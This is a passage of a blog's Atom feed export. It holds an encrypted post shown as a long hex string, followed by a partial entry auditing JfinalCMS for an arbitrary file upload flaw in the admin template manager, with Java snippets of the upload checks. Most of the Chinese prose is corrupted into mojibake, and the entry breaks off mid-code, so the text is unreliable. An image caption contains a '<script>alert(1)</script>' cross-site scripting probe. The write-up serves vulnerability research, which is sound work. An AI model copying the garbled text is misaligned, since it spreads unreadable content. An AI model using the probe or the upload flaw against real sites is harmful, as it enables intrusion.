6a50643610c9a8c1ccaa4abdf676c1666a2642a5c6ae21e6fa0f4d965a9e0f5fdef28bca249a6ce84e37389e2e414828217922de40c272078e8926aae514fe64c7e5aee5661b75de21c82f093af9db0b2d0011c556d668617a4bb1e481f9eabb4e432542753c9054fb9bf295601d7452deab7a2125c16cdd169abb3eadc1e7a018b54027f7f6ff381ada204b61737cc57a25a660500bb40c98a21ff4879591ecdcad766a71cdb66de5e57909aa91a025a4cb0a8afe6bdb386bd38cadc9db10df11ecb46c8a503d358e97a805d6d8e390da4b23f502bf1f49962dd5252779453bd537953425f5f07ed5fe091c246c4b6e88ee59942acbf5dec3779bca5434b057c4b1dc12d6366db952c754b0a8904b60684c60db30821cde23bf234a3ebda49745a436c11c13d8fd8edb05251fcf36d2c5b82443d2feead7dcefc57163815cf1918de45273de4e200707655bf785de016f43e4bfa8cdb371da31fb1a516e5c87249223aba9994c2dc069fc9ac3901f57c4b4f844e6c996d10d233edad1ffa466390cab85665739ad5723aae96bbf034031a114c70b8a45b02a85a197dccd7dec51cbda405d02d12426ec33e2a68699651e6ba8e6c976de85bb3b1e5c9459d3b07c7afc8314f0cf372d14d178eadf18e4a0429ba8f540698cbfbfc2bc9a8e18b370138b25f5e129155df314d0b178177de4b6db345cb30254970527c05314ae160dc0b5c8d4281ffc0c6b55ef3c2b6942d4a5275cd0d594caefe0eec3e48ad20ec20a39cd0c7cca04d8d4c42e1439309b2edb3ed4ceda1235c70d1cbe2c3cd5141f8b27ea377264cf96080c257ff9744985ad5f6f64a4c798f170f158a3fac64d8ab1e6d017c0ac65b2ac0a68cf4d099d75240a3635c608bcbb5c6e5b2f20d797b3ac0cf100912931fa16f31aeecf5eafa0fa74334b0eab7229fece3d60ca647f5bb13e2644a038b0c49991e752705678a06372c41e4a342bcd1664bc79d733f76b6bc9d1d53714dc02df798e35fe490ee4e7a45f3732c339065f2e574091ed69f0a10731b918f171d654f27d57da8fa9ae791c6e5298d249023ba06959bf1f2d3a66b83435052bcb1518baf1c39a19dd1be9c6a6c21503142bc8d99292277bf3abd8e1b0df6602b97242a151c7ea1de65b09c891ceae4d7ffed84b560a2ca6fb1b05427c5e4944dc4413a91ca0eef8d9f8eb660e19de15d9cf574788bfb894db24d46297b810b319b53a3ef877d465ae394f855cdc7be674ced030b8ef3833c15ff49eebc138ec0d055ccf51a29dacfc532111ea55871de8ee54ef36751f5ddb02ffe6e9082b96fa3e889fad87c09a6271f89b17ed04fefa2eb8f31baf90c0793f94d60eb2b0b0b3278d710fd6bbf5272b4c307e45faf18ba1e534ac82650110039eb022ad93b3750e6585fdfb0438f87082db9b873390c008458f8e767c50be9a3f6886dd9da01950eab6d07197774246fce91d8eee36a07f44c07154668149b4a5c5350bd86b00b69ca6e8714393bac8ad54be33bcedf9d4a6903fd54581e2c04d398f8b52aefd233649c6fb6e1e0b7e4a0dbd9077842576cfe5ac56a8fd7f63ce19531503d2d409c7426430aca67f1e6c083c7de3581eebd048dc864cb15e64bb14993743e624ae4555605e3557e668e5ec10882f72f2557b3673002c1eb85b115d9cead12276f7c5db131c81654b8f11ab44f1db62ef363c157430e531156fa850c264437adff2e042ee942c586a079a7dcecc4dee2f517c96f1728e7ba0165cd9707083fa883b4e37f7c4d94cc980b750ef29aa2800083f1cf8fe5db0873ca0886e01b452d9ddf0c8e21094eb1f5084ba0b4076cb47b055df328adb6d2c50b39e66e9f0f690e431b2fe78652804493b88ee7003ff5389b07b96dac122067a9ef4547d6cf86c1cac5726efaa00151c5afbd3dd7d35fcd808740df6ad5ca28a66f474f938b7964ab4905dda04c5b25327f414eb12dc5b246ac1fbd49ed7857124151d36be4acee9464bf71db0da5a1da24eb750fc0206eac4808421a5d18e823ec5d83710f93b37d3da0c26fc0292f745d76a0770e8221ebbc46452cec0c1fcd6706be38bb8338ad96a83d6e1e477a3cc4199dd62d0fd6d93090577d2fc33c43e32e9cf38c6182518c065aec072c6c6b31eda0eec3534804a3d9064189d11ec279d5bf186bc5bd969b14caf077a657dff6c9fdccfcdc40bbdae4c7c9fe466303dea65214d68abae48075083d59664c8c00728496670a871605aae2bdb03b58ec7d7c70eb6fab9ff18beb93ca918377874acde9035eb3d41f7e7460e6e84845e153f2017be0cc27194a844bd9ad1f2b1c51238437bdc216807b536387b094f4da37590fccedc7acd4155fa41dfaecacaabd72a0b37bac0a2ec2db9b79cc7942c1dc59bc300a4508864ef26a26ef9fcb6fb34a4f13ffbb2ee2b2ae0a26a55e4c0deebbc556dfd87fc3787b0fbf6086654ca8553f7c1d270de0dac33e2ad17adb2c2f6f8e0da5d8f6b95ecbee88d29ba581d9ea9481447bcd1071052c9b616522989611663ffac49ecfea4c2e58bd29a04c5730b4ee295ddc3fa08e5f96a1f806b06c1fe3a4ebf57451667afc1bdc44db1266c23089181b282811761a0b6a87b38036f439cb1a45b1b3c5aa1a3ee166fd436dba393ac930bc69a68e69afaea257480241de61301bc2a7e13ba71e7dbff3f25c2a3829093940e07f86112b2120db0b924fb44e70be688b028bf8df610c0c05e246fbeb327b4583c5c8e8dd219359e2fed48568dfabe607a23dccb4b1b6d5f4a33aaad92fbf1df30d9960936010958b6713169876b57968df78a0117f9d0c7a8c7f1dcf762597d814aabfd07c15220e08658e7e4dd9ae4b5ba2a5e5b74a831d261d1d4311e5b77fdc015e67728b038e79353d8ddb6173175aaf1996bdd5c4561878eea1347c38b6ed73c35a274c206c218620a5a3d0382f1eeb316ebd7186893e7df653c4737b07c8fb131d82d1f53d155041f81cbed4f6ca3a2ac19f6d722ab5043f1b946cddae756d65c9ecb6f2cc5861409980327871cc81a4eea87cda978f391969a10dcf274f51a53a6ad6bb6defceaff6d46148f7de42fd757475bd314d44b05a949b8fd68f561a988f01095a74ddd900f286025b41d0be46b3b53401be0bd1a0ae522cc5936843ecbc7e6db5ee51f2303e21667955268f5d81319d8bea2990c105e3a7e9832ec723de4ab319fa37809a0d81baab47570484bfa524786723e8920f1ba0301707367fd8425eb93958ed43a3fe38b4702fb7b49399ce8debf69015956dae9755454e839bf5ec78f2064db4ccf58bd06ccd402d3c0d9b3c6e76a749ba10ed02eadab46c66f134a5d597f85bb15dd0391880c506c19afd9f76f84663cce386d99b571569b4c368d2511e733a94203f9c899fc624ae94a4edb8b2060496cbb52396f61cff462efcc71fb8294948797391c20cf6004ccb1311877c875199dba6ecb7fd55901f13817947ea047951b7e39e560c6f1c70d6771b693c204d05518e019127238acc981b3900b96cb62b3f49a7c15440a4143fd14d09446db6dc6515680307ca303fe239934c6bb4074a8d8244aeecb1632fca309ba19d62d079e06a27c2803ff627c5b627b24a7972f9fc3bd6ab917ff75aef27aff57429e17aa7f87fbef3055f4a6b4a259566c661698d82e6a4b6fc4ae8884d03b42bc9aa6b70a0427fc1a99596bf7430160d2a5e0ca34212ef758aad01631c1fc3a5040694b9f704f907b210f81c290fe86b60c394a95f6ff53f214d7077f9dcbe1d44f23ab2c49f52af7ffaba7099745174ceec01a9eddfc246f627fcf61688be75ab26b71b05eff9f7b7c5f185c70c15759bc6abd9ba3deeb5700c4be9ad32c1ce95c3e2d0f79db5ac7c24296a825b1be8ee3110ff2ee2e060baf6652e0066771a320ccc3dc38dea4da223d301cf65f82c7b8d27b85607a8b0a288462a45453e119c9e1477fa434bd1ded19cbb2e537a4c11bc77cef6eb5c91b42f224026b12ed041551e11c980e616a6079fe1e4dc5b45e1bba0190767d96f74b32a221ba0d11afd5a302d5704e9acff337c8b90bd0ac05616abc84734c3fc64516f1ef621569c20401547756226c1eac5ab1347a2b760af836124e6990a0acaa3fd6b59dc235b2326726e660966156ccfc766a800c2a40e26581989a1a1a52f75124ac19be9f7cc57a7779d9b1666a71f7cad5ee2be7022b89a93f51b2b2a9a7c840421f16dd1971952a5b69607bd77624a3365864aa9247144ba59ba56f1767fc2125b967c01b85e31888be7554452fdc7f24c2d4aaac48874972d3a7f1a5e95949dc1b22a4a52cc107a62e6491eeb8636f6363a889dbc07d03bf3241bd719eb8d8f480f7bb4157fb9b13a45ed3465d9f31e8184298e5aa9dac8b6d2ba8dc8728eaf614170784eafe6d2cdec7b99cc1a8ca3691e3ccdc00968dcb26f31c9699d5a6410499bfa1e19a91906e3c64b9ed821a625d6d103f55213b72cdc4b362c02212cd4ae3a4ca536f7f2725d0ea3b753b3e20cb1d9c982717a9dcca83b30edb4be67553b26295f3078a82ac175b8adabf18f2d06ee1bc5110b14e808b3d62dfa383a41f3366ceb7a914ca4a22ae51951b33eac0a79f71d43156ca70bd657d55b2cb0fc1c57b78bb49195556530d2cd919dc3837ce027418a8af77eca23e80db229907d2fa5175828b82915f9821ab9ba7f5f5667844b992fb9e5fa7e733ef8ea6842da41f4608a6c383be76d6c2ab15cdc13053de7e2d94be011f5e73c021654f9d1c5335d05701773dcf340e8b73e157c15805f98efcc722accf6404b5bcb971ac4d1c297d2f0b7ff0af364b2ec9ac5d10bfc2d17c1e35e0b50cca0b9874c80d0087ac3b43fdc8205bf438f67a5fb3b647f7bc85cd38a239e7400b3fa3acf21c7b5a95efa9ef6267c9e58f648db87c432105f574bd9921ae32e069bc4ec8ba0f42b704112766f4dbf8846d7411f4a433666fc3b463a2ba85e0e4fcbb13255e7fee2de703451397d910703aa6b530bba08e946bac3bed0bba7841fb9213c2c8ef90ef75e8de8daed9fd3d3ca7f5c3d1cae49b53ce632d171e7be691d6bcd1306cdc16fc9b70fda9d5e1e2f052e60c8a74edf0bae8bbd1577dfcdd0a11f93b77e3772976c58ba3d5dd99e0d547eb2dc3d49b755fe5ecab0092a990aad2416dda6f53fe1d61cf23b0175f6a4f5648220594c6a3be229e858613e41af332d4b4bee0d6c9fea40d5587fc22f14c8ad39252952f117b7ecb701d90fdd817dde60ad15ce23a64bf1466e55c998a01f3686fd64d8f84988e9f8ff7ada0b3fb3cbc4f5848c9f246d8197edf4b5b4cb297bdd0bd2c8298d8b68c205c001be99809ad9a2f13af067efeab3d84f4ebc4c7ba0b9f13450957b5f2638b1cedb9fb8bc371435af91be4529d15d6d48d7d24e4a2b3d6469e1f2492c472cd562e654c47de6836f32104def1865f94f27e5f90507bd23286487ef21f2e90a51491abf23ee0c2f2bdf4e0c8d3156d3a5c8dab198e58ed5dd6f03d1d8f49f1e955714aeb71997f00676eb6997b2b51b0441e18c09c27c09fbcfa9fb1312c2bc89d37cddb42a6fecd8d692c33b69cda5cc15579d29be4862af27f69ee0d8a099294df161995f7aaf8cea570e8794b3da747733830afe93a28759a1f72dbcfff65f12b4313cac21ccd70bc9cd80864dc20f6eaadfaf5f87978cfa06618edb1cecd5e5615b6fd7425f3485a112150ae4b4bf8bc1fb1df16adfcd3580f360023d658770e416c2afa9ac5294bae025375eb555a4e0469c6c23e94e16046f2de87692229d8dc203b1512a67747950c2c9fbd662acaaa9012aeaa954282c79caf77a3efe0da58ea663d12ed835e207f53c7d56f6ed4795c24b3186d7f5bd3442472087a65fc21c9a7932b34f65b575d701f9d6ef34ab737c7c802032ec8467b8fb6f7d35b77125bcd80e1f63d7502bb5775176aa592842c0ca6a13d05a96a5a36a3310ee34ce6429a5af538c686571df74654ae2594829a6fda386a1a5f68de4982bf72f0059fb99f78057e5d706b83639d33205e226bd1d54441a0ff6222ca11b885db49e2124462c04709ae29f223fb3308c6adbdbdaf4f84b0aceb5630cfa550dc1ae9d57b48c157595bc00bd39de9eafca543fc747ac428ebd51a8a3f2c4e45faf766a677a7acc8500825953d8da21c21211045089b3ec5bc2f7bcc1bf0d4c8ac4b5c3d9fc1b89fc26e2d9ff07e1b02416fba9798a75b1163665f010352ddb6942d2ef0956fe608a8f99a9b9d105ab95764bf6523f1e1c2cdd1d0713f6b39168a78fbaa49bc5d9d488d628d74a4838e969b454effd7dd9b2d834b7ada45f5ec22c5c0e6884b20a3f26e52c081e04e7212c1d816f3dd1c83a194fd94f5886745d356c1854ef4b23e63b812495df0025efb35d3bec540840c7e6b851c5c1235501f8487aad0c4ba9b3b3050a18faa675a45690860221a45511c0371b16e78906cda996456e999ca730c6585dfdfb4cfbbc5172b09ac4a1a61465d3d48c023bc95a058e76bf75536ab46307db242670bb4802d97046bcdaef5f8fe1503685f98075a65093797b52bdc10225e654f5c0eaea4e96f031b821f0f7f4afb6165d2d75603e825324b6fde69458190b36d04722f316c3c6fdf627040915ab400c17649400568769c275919c4d91c01bb179d75d8c51cf40f1a8ba83926c6aca824170952209e761560dda2967d3be44eabfe81fb2d7483457740c2f04b9c75c92f099dc9595b5600ccc8a418ede954e18fb53af4dbbc8df2e7c1f3f386c410689a91e093789c00a04bd24e9cbb5b6cfbe3402a017c63e2d4d2f660878aa1ecc467cb3bbbc2e22a8062d02079499e7e8238ca906ba5c8023cf9ae8a756dd797d290bf18a57b97a0361a5879a6debdd694141d72660e78d252d127df3743f764259768bd7955beafcc38e05b4b8801e515aa38cb3e985feaf54e1fce3fe9e69ffd273f512003bffcd8cc1e697175027f6a8fbd3f14111820efb28074efca824a6a39a9baad49a50670439ec8d9a85bcf89044eb4d3887f4bc6201bc737343c0e37d605940cc250b1c42cbac62db95097a0d14b5958d7606ce7ebf53ef248fee9c936d5ae0e8a0658d03d968939088b63eb6695c97bdad450e146f6a6ce306f743335f5449422a811f62428af8121e3c345f3d5e0fc857856b329b30eedbdb70b2a869fb046884af3898c5e47059c318f83412f21695144327205cb4ca49b2b8c066c027e9b1ab27a89527d298f1e68d84cc18871e9bfa966e38bc2f85763740e88be92217597840ccfd937f5f50f6d3412266e35437b107a007154f16b375df4714acebcb3af270c342121b78e147826041671fa85bb3767c9e52f1967fcfc7b7851e9cb11f4cbe69598e9ab9a495456f203d964efff24ba9cb678c3c5e8070e2b0d82999f8007210a7721daa9f1072c1cb9c58de2632043b15c41901a00c99195044739b9fc876415bbceab347108a0975427b5d409ccb4ebd448c6d9b4280dcabcc5fcade54631c0239c7b73f5b6bc4ffc5347c58f017bbabba9f9038749d3714f9b823a62c65c53d361f50fa7ec8ec24c36112a4485f7684cbaf77ec4ef2d479c71d8ea2780b97095d6e8c7ef94bd2ac84a9623074d2d3511150671a6cabe2def5e13fc513d73a86123e6d6f8bcec134adfc69eba9f107dea4913eed675e7e7ae4cd22185fd7bed7e06f7032d437d87dc2921c9721c363532f1d1c79245471fcbd23701fca380d348d54e69f65dbb9f388ce5964848de42a73f6c86fa4c08d8fcc02b6845880381d2204546aa510d2aa9eedc172f4ef4a7d6e11ed2006b8be94b140e5d3f277d881d5af31eaf016825e5fd39d5a1d2383baab557dd92d9a42471b4ae3fa29ceb10280dcf1d4a4ba23a65e9c34d8a923234b9fd3646d37af06d26c2365fbc193b36e4040c9f5a0b5691d63b0633509240f4fb1509910d92fbed23891bcf73ef744f3db66c921d7de49de26e650b74da30904e211854b3cda68fc96cda86ff036b52e6471c60cc80e3209aefe99912e80a4e8e234f7edef11564c97c2b1f8969bac0f0ec298a9c5a9c6a783ca907c3b977f6e94d67f193149694561d9674211a57184cab9a4b41a1e40776645dd8822511d700ff0767a499c5eb4e6430a54848a3ab2610d6e061ad565dfedfc81827d835ae936ddc1ff1d3a5769d92e96d98396c1698a2e945651b90d3313f1246d8aaea8429b0bb540e35ef761c31dada96cefa8761c032c7fd15d00d179d44b571edafe041ada584141bccb233255fb1b369bd70cd03d85c544c79815f9774cc295deac8ff92ed477f76cfc6ab73827667bcd62e8cb71a2730aa6792d3f61fdc40ab6b5c9c44462bd607327f5d4ec5ae1942dd929c4ebeb320fee7af68e9c8c7cc25856a4c85bd7cb6488fff531f204be695f1fdec72e9ad51187b327e9ea65d97d31e5e799c688b77ebbb5ac8364b42982e3b12242a37faaab9a25b348ad0f21ab12cffb7311c6ee0ddccbcca36759496d299f5d8e690f70b7c34efe9ff6652aee943fefa14270692cbfb958fc39f6a6801c1bfb88957a1434a020516fe451a0f430f79c16a0b39bf830487d1d7db59afe7b0dd20c79496f52f4776092a9d0d2edf0c0451ffa5f1f1037b4a16b64a0df747ea240d0aeee0253aa5ddd4a778c8ea837a9699cbb8d9cd48eb1bd68dbf0ef0d4e48b54dcf36de4caaca8dc62c59dab6d7aed861a7cc0cb94ca3a655ed59f6da19364dc4d704544c66576cddc3494f3c4187c4acc58ef428a0c7b645487b3e0090b61e378327d96c1b3981597028374b4a8dec044b90cd6a5244659898bbb62ceedb96345bba5af36633693ccfe553ce2f3c0f9b4a434fff0c96beb75c403032e9cc9137792d74b9942329f4baa4e4faaffbeba9f3c6c6b6a856b6faf3a3fc1ec9dbfcbfeafba693e9ed855f223c60dc42126cd59ec38869f2fa3cd4cc747246492431e9a67cc20a9f81259861c6513382214d4fb5a38268545c28634d33a33adcf7d9410dafa91bc6aa83bdfb4e4d64d9c3043dca35b19aec1775280b46e05cffbbb024d24d3d7d4dbc343124c67e2f67867fd025ac99a96c9f3dc42baf785238d2a92fb176113d7b6caf2395f30a65143408f9efbe0d85f6326037022d5f0314b754d4fa83c687875ff4120273683dc43d98f1391b01e2b9b13edebf5618a468504528316c53443bfdf8b0f7592c43e29fc654e16922b8ee265d93c59da7f1f4302ebea6c4cb039f10f3dd6439c256da8d4fc2df85dcd19d8ceeca7692febc642937a623a94e53351431c58204c17a6d0adbf0aed486c9232b05f3d79eda5d027031c4cdcbc7ecea34a9102e5f05a9535f6a89594cb7597196214d90c02a7e4bffc567fc77a30ba7dd129375a9ced35a6a91e0458e44f2b6f752b8d6ad966c590871beae8d37a1953456fe119e1362f53d5d44108ba40963f2829adee43b360cc993c563e513292ff7199ae21824a6499fec6f7c0122b4e083c763d0d70e6328afde1f0f96389e8a75f21f7887bfd4cd9150499c70c993d802e3b0958b8719bd216b6031483255afa1c857cddcd5f570e95b5c7cea14f5266702ec2dc937b2dab4f8af2591ddd5a548d724aa4d42342c354365bb9ccfa8338eecec54a6b84b169f02e4393b32e137eccf678051976763a58f46452071b8c05b9a658d4856ea265672200a4b0051bc3e5334d78dad0ad39c3954ada017f93e8160eb0e5d89e3cabef0c77bfd42c64c553a94db05ece5ce75c21740ddb4a2a61a1f18f6df24750d4fe0ac886b1c32a45a74f92462e4de44673c483cf6210ee4db1e723b6ab09158a880215ae0920d4f529ad74e268c46fd6f2bc301e1e50ad2d3ec16a035a6ed316e41905f844e2c3069d1fe6aa8ab0f377309d27217c083f6c4db16035925dcd9c0e57da76139347600c2976d9c3eaf1f3c3d4b7aa316304e82c59d1fa5becb7b44e6d3cc876631515418ec65deea9293e9decf7fe065559437619e9f7e441b9229b1b1ad1a974b282c5f721f646515f2e7026ded1d98c92a55dc6466e98ed536dbb1d6afb7a9e31903839f36a040af92be6c1aa8d5d39d2b490b1cbffeb3fa92a4c90e15ac915f5d6ce9e68ea11aab458451b27cc6e9077470dfa06c09208e4a9b47734d52476ceb1a069f4a6d11f1686e0941faa538b2d756d1edeb4c367b2092af81f50de775207672fc370b3341c058b4a4173bd468579b447a4135e143e841a3d3a68bbf66499167fe234f52f7186307c498d23d2e06aeef2ac621e68c3efea18052e3f9b6960444b538eff8d5ced84b01be43a96237b0ae72daa9c49b0edbf8816d2b073a9f47d1f224cc92d7e246e903ac2e01ac4893e1e49d231719c684cffaf113f58a02623b849dc2b80a2dc2f746e1922c9446504cb605015e8c3785bd6c74a4bdc575460f4f29c79f639c4cdcd3c457893db3639a7a5b75fc705109030ff773089c5a2293e9025908139f175b6b3c43091de4cd32639b49dfbfa41d8822971b87be25b7211b862f4252d4ece1f144f17246299a563265e43873c2a16d48ee34610a16ce8e85e3416b6f3db59ba0cdbca99c40c5a8a812db10d9ef475dea147979431ea30d87541b8a2184cf1b02c90edad7a166924f97b9231def03c2f4f90374209ab7084f9dda432e1709ab18d05b31559741acd4ef0d775ca8cccfcc7189f225b446398aed2f5a8a4c00a732868b85529115f24fe943a1bff02b832c6d16d06fa5e2c6eef3200766398d0631f2bb9a5a5951feff6c326d09099682aaa384c063ee95afb6842c2815cd36ed9f18012e8060be18b359264d099d1f749527e2e19878af0b205cebc894d01464e224714890528a36cbcf3ef49241fe4f98343800c79eb4b8e07b0b2253fcd62f2cf71bbc0f9b8b7350a29e51e6d75c5cf2ad516df6101861091fb82e8ab648acb11ad18972946f56b460c12f5921e67616a98549d8c266e2eede193316462ddeacd5f7dc2ef1804095a8f1f414f0ec8ac8dda056e07cac1d1ebe36a7c95c27e74d3cb8f4633b432131b68b54f5c675d0b63a9320daf2e9674fccb2a7934e6a399e4d98d3714ebbfa56812551f15926b48e88a2377f5ffa2f4ea8f3532980deae4cbb924909a11dd980af75a143</script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      Here&#39;s something encrypted, password is required to continue reading.
    
    </summary>
    
    
      <category term="ä»£ç å®¡è®¡" scheme="https://summersec.github.io/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    
      <category term="ååºåˆ—åŒ– Java shiro" scheme="https://summersec.github.io/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-Java-shiro/"/>
    
  </entry>
  
  <entry>
    <title>ä¸€æ¬¡æ„å¤–çš„ä»£ç å®¡è®¡----JfinalCMSå®¡è®¡</title>
    <link href="https://summersec.github.io/2020/12/20/%E4%B8%80%E6%AC%A1%E6%84%8F%E5%A4%96%E7%9A%84%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1----JfinalCMS%E5%AE%A1%E8%AE%A1/"/>
    <id>https://summersec.github.io/2020/12/20/%E4%B8%80%E6%AC%A1%E6%84%8F%E5%A4%96%E7%9A%84%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1----JfinalCMS%E5%AE%A1%E8%AE%A1/</id>
    <published>2020-12-20T13:27:45.000Z</published>
    <updated>2020-12-21T07:12:31.407Z</updated>
    
    <content type="html"><![CDATA[<h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><p>&emsp;&emsp; å­¦äº†ä¸€ä¸¤ä¸ªæœˆçš„Javaä»£ç å®¡è®¡ï¼Œå¯¹ä¸€äº›å®¡è®¡æœ‰äº†ä¸€å®šäº†è§£äº†ã€‚æ‰€ä»¥å†³å®šå®¡è®¡ä¸€ä¸‹JavaWeb CMSï¼Œéšä¾¿ç”³è¯·ä¸€ä¸‹CVEã€‚<br>&emsp;&emsp; è®¤çœŸä¸¥è‚ƒçš„æŒ‘é€‰äº†ä¸€æ³¢ä¹‹åï¼Œæˆ‘é€‰æ‹©äº†è¿™ä¸ªCMSï¼Œå¯èƒ½æ˜¯ç¼˜åˆ†ï¼Œä¹Ÿå¯èƒ½æ˜¯å¥½ç©å§ã€‚ä¸»è¦çœ‹çš„æ˜¯è¿™ä¸ªé¡¹ç›®æœ‰QQç¾¤ï¼Œå¯ä»¥åŠ ç¾¤è®¨è®ºä¸€ä¸‹é—®é¢˜ï¼Œæ–¹ä¾¿æ›´å¥½çš„ç ”ç©¶ã€‚å…ˆåŠ ç¾¤ä¸è¯´åˆ«çš„ã€‚<a href="https://gitee.com/jflyfox/jfinal_cms" target="_blank" rel="noopener">giteeåœ°å€</a>ï¼Œ<a href="https://github.com/jflyfox/jfinal_cms" target="_blank" rel="noopener">GitHubåœ°å€</a>ã€‚<br><img src="https://img-blog.csdnimg.cn/20200407202518575.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><hr><h1 id="ç¯å¢ƒæ­å»º"><a href="#ç¯å¢ƒæ­å»º" class="headerlink" title="ç¯å¢ƒæ­å»º"></a>ç¯å¢ƒæ­å»º</h1><p>&emsp;&emsp;ç¯å¢ƒçš„æ­å»ºå¾ˆç®€å•ï¼Œå‡ ç§æ–¹å¼å¯ä»¥é€‰æ‹©ã€‚ç¬¬ä¸€ç§ç›´æ¥gité¡¹ç›®çš„æºç ï¼Œideaæ‰“å¼€é¡¹ç›®ï¼Œç„¶åideaä¼šè‡ªåŠ¨å¯¼å…¥ä¸‹è½½mavenã€‚<br><img src="https://img-blog.csdnimg.cn/20200412200121848.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>ç¬¬äºŒç§æ–¹å¼æ˜¯å»GitHubæˆ–è€…Giteeä¸Šä¸‹è½½å‘è¡Œç‰ˆã€‚<br><a href="https://gitee.com/jflyfox/jfinal_cms/releases" target="_blank" rel="noopener">giteeä¸‹è½½åœ°å€</a><br><a href="https://github.com/jflyfox/jfinal_cms/releases" target="_blank" rel="noopener">githubä¸‹è½½åœ°å€</a></p><hr><h1 id="ä»»æ„æ–‡ä»¶ä¸Šä¼ æ¼æ´"><a href="#ä»»æ„æ–‡ä»¶ä¸Šä¼ æ¼æ´" class="headerlink" title="ä»»æ„æ–‡ä»¶ä¸Šä¼ æ¼æ´"></a>ä»»æ„æ–‡ä»¶ä¸Šä¼ æ¼æ´</h1><p>&emsp;&emsp; <a href="https://samny.blog.csdn.net//details/105385042" target="_blank" rel="noopener">Arbitrary file upload vulnerability</a>æ–‡ä»¶ä¸Šä¼ æ¼æ´å­˜åœ¨äºç®¡ç†å‘˜åå°ä¸­çš„æ¨¡æ¿ç®¡ç†ã€‚</p><p><img src="https://img-blog.csdnimg.cn/20200411154350644.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br><img src="https://img-blog.csdnimg.cn/20200406165725733.png" alt><br><img src="https://img-blog.csdnimg.cn/20200406165740279.png" alt="&lt;script&gt;alert(1)&lt;/script&gt;"></p><hr><h2 id="æ¼æ´åˆ†æ"><a href="#æ¼æ´åˆ†æ" class="headerlink" title="æ¼æ´åˆ†æ"></a>æ¼æ´åˆ†æ</h2><p>&emsp;&emsp; æ–­ç‚¹è°ƒè¯•ï¼Œæ–­ç‚¹è®¾ç½®åœ¨<code>E:\Soures\jfinal_cms\src\main\java\com\jflyfox\modules\filemanager\FileManagerController.java</code>æ¨¡æ¿é¡µé¢çš„æ“ä½œçš„éƒ½æ˜¯ç”±FileManangerController.javaæ§åˆ¶ã€‚</p><ol><li><code>HttpServletRequest request = getRequest();</code>æœ‰ç‚¹JavaçŸ¥è¯†çš„äººéƒ½è®¤è¯†è¿™ä¸ª,æ‰€ä»¥ç¬¬ä¸€ä¸ªæ–­ç‚¹è®¾ç½®åœ¨è¿™é‡Œã€‚<br><img src="https://img-blog.csdnimg.cn/2020041116011776.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></li><li>ç¬¬äºŒä¸ªæ–­ç‚¹ï¼Œå®¡è®¡çš„ä¸Šä¼ æ¼æ´ï¼Œè‚¯å®šè®¾ç½®åœ¨ä¸Šä¼ æ–¹æ³•é‡Œã€‚<br><img src="https://img-blog.csdnimg.cn/20200411160132564.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></li></ol><hr><h3 id="æ¼æ´æºç "><a href="#æ¼æ´æºç " class="headerlink" title="æ¼æ´æºç "></a>æ¼æ´æºç </h3><p><code>åˆ¤æ–­æ˜¯å¦ä¸ºç©ºçš„æ“ä½œ</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> JSONObject <span class="title">add</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        Iterator&lt;?&gt; it = <span class="keyword">this</span>.files.iterator();</span><br><span class="line">        <span class="keyword">if</span> (!it.hasNext()) &#123;</span><br><span class="line">            <span class="keyword">this</span>.error(lang(<span class="string">"INVALID_FILE_UPLOAD"</span>));</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><p>&emsp;&emsp; é¡¹ç›®ä¸»è¯´è¿™é‡Œä¿®æ”¹ä¸€ä¸‹å°±å¥½äº†ï¼Œä½†é»˜è®¤æ˜¯è¿™æ ·å­çš„ï¼Œå¯è§å¼€å‘è€…è‡ªä»¥ä¸ºæ˜¯å¯ä»¥é˜²æ­¢ä»»æ„ä¸Šä¼ æ–‡ä»¶æ¼æ´ï¼Œä½†å…¶å®è¿™é‡Œé»˜è®¤æ˜¯è¿™æ ·å­è®¾ç½®ã€‚<br><img src="https://img-blog.csdnimg.cn/20200412135823674.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>&emsp;&emsp; é»˜è®¤è®¾ç½®æ˜¯ä¸€æ¬¡æœ€å¤šä¸Šä¼ 5ä¸ªæ–‡ä»¶ï¼Œæ–‡ä»¶å¤§å°ä¸è¶…è¿‡16MBã€‚<br><img src="https://img-blog.csdnimg.cn/20200412142146187.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">long</span> maxSize = NumberUtils.parseLong(MAX_SIZE);</span><br><span class="line"><span class="keyword">if</span> (getConfig(<span class="string">"upload-size"</span>) != <span class="keyword">null</span>) &#123;</span><br><span class="line">    maxSize = Integer.parseInt(getConfig(<span class="string">"upload-size"</span>));</span><br><span class="line">    <span class="keyword">if</span> (maxSize != <span class="number">0</span> &amp;&amp; item.getSize() &gt; (maxSize * <span class="number">1024</span> * <span class="number">1024</span>)) &#123;</span><br><span class="line">        <span class="keyword">this</span>.error(sprintf(lang(<span class="string">"UPLOAD_FILES_SMALLER_THAN"</span>), maxSize + <span class="string">"Mb"</span>));</span><br><span class="line">        error = <span class="keyword">true</span>;</span><br><span 